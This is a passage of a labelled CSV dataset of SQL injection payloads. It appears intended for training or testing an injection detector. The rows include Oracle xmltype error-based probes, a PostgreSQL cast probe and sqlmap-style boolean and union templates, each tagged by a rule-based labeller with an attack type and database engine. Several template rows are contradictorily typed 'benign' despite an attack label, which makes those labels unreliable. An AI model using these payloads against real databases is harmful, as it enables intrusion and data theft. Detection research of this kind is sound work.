row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
41082,"select * from users WHERE username = ""1%"" or username = ""1%\' ) ) ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) or username = ""-5062 ) where 7457 = 7457",1,,error_based,oracle,0.95,xmltype ( detected — error_based injection (priority 4) on oracle,rule-based
41083,"select * from users WHERE username = ""1"" or username = ""-6190\' ) where 2621 = 2621 or---- 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --"" and username = ""1"" or username = ""1\' ) ) )",1,,error_based,oracle,0.95,xmltype ( detected — error_based injection (priority 4) on oracle,rule-based
41084,"select * from users WHERE username = ""-5863"" and username = ""1\' ) ) ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ( ( \'ykjs\' like \'ykjs""",1,,error_based,oracle,0.95,xmltype ( detected — error_based injection (priority 4) on oracle,rule-based
41085,"select * from users WHERE username = ""-4582 ) ) as gvfo where 8885 = 8885 and username = ""-2783%\' ) ) and username = ""-6190\' ) where 2621 = 2621 or username = ""-1254""",1,,boolean_blind,generic,0.95,"8885 = 8885 and, 2621 = 2621 or detected — boolean_blind injection (priority 8) on generic",rule-based
41086,"select * from users WHERE username = ""1\' ) ) and ( ( \'yhku\' like \'yhku"" and username = ""-8860 )",1,,boolean_blind,generic,0.95,) and ( detected — boolean_blind injection (priority 8) on generic,rule-based
41087,"select * from users WHERE username = ""-8069\' ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( \'qbvz\' = \'qbvz"" and username = ""1\' )",1,,boolean_blind,postgresql,0.95,) and ( detected — boolean_blind injection (priority 8) on postgresql,rule-based
41088,"select * from users WHERE username = ""1%\' ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( \'%\' = \'"" and username = ""-6665\' ) ) )",1,,error_based,oracle,0.95,xmltype ( detected — error_based injection (priority 4) on oracle,rule-based
41089,AND [RANDNUM]=[RANDNUM] AND [INFERENCE],1,boolean_blind,benign,generic,0.8,No attack signals detected in payload,rule-based
41090,OR [RANDNUM]=[RANDNUM] OR [INFERENCE],1,boolean_blind,benign,generic,0.8,No attack signals detected in payload,rule-based
41091,OR NOT [RANDNUM]=[RANDNUM] OR NOT [INFERENCE],1,boolean_blind,benign,generic,0.8,No attack signals detected in payload,rule-based
41092,AND [RANDNUM]=(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [RANDNUM] ELSE (SELECT [RANDNUM1] UNION SELECT [RANDNUM2]) END)) AND [RANDNUM]=(SELECT (CASE WHEN ([INFERENCE]) THEN [RANDNUM] ELSE (SELECT [RANDNUM1] UNION SELECT [RANDNUM2]) END)),1,boolean_blind,union_based,generic,0.95,UNION SELECT detected — union_based injection (priority 7) on generic,rule-based
41093,OR [RANDNUM]=(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [RANDNUM] ELSE (SELECT [RANDNUM1] UNION SELECT [RANDNUM2]) END)) OR [RANDNUM]=(SELECT (CASE WHEN ([INFERENCE]) THEN [RANDNUM] ELSE (SELECT [RANDNUM1] UNION SELECT [RANDNUM2]) END)),1,boolean_blind,union_based,generic,0.95,UNION SELECT detected — union_based injection (priority 7) on generic,rule-based
41094,RLIKE (SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE 0x28 END)) RLIKE (SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE 0x28 END)),1,boolean_blind,boolean_blind,generic,0.95,RLIKE  detected — boolean_blind injection (priority 8) on generic,rule-based
41095,"AND MAKE_SET([RANDNUM]=[RANDNUM],[RANDNUM1]) AND MAKE_SET([INFERENCE],[RANDNUM])",1,boolean_blind,benign,generic,0.8,No attack signals detected in payload,rule-based
41096,"OR MAKE_SET([RANDNUM]=[RANDNUM],[RANDNUM1]) OR MAKE_SET([INFERENCE],[RANDNUM])",1,boolean_blind,benign,generic,0.8,No attack signals detected in payload,rule-based
41097,"AND ELT([RANDNUM]=[RANDNUM],[RANDNUM1]) AND ELT([INFERENCE],[RANDNUM])",1,boolean_blind,benign,generic,0.8,No attack signals detected in payload,rule-based
41098,"OR ELT([RANDNUM]=[RANDNUM],[RANDNUM1]) OR ELT([INFERENCE],[RANDNUM])",1,boolean_blind,benign,generic,0.8,No attack signals detected in payload,rule-based
41099,"AND EXTRACTVALUE([RANDNUM],CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [RANDNUM] ELSE 0x3A END) AND EXTRACTVALUE([RANDNUM],CASE WHEN ([INFERENCE]) THEN [RANDNUM] ELSE 0x3A END)",1,boolean_blind,error_based,generic,0.95,EXTRACTVALUE( detected — error_based injection (priority 4) on generic,rule-based
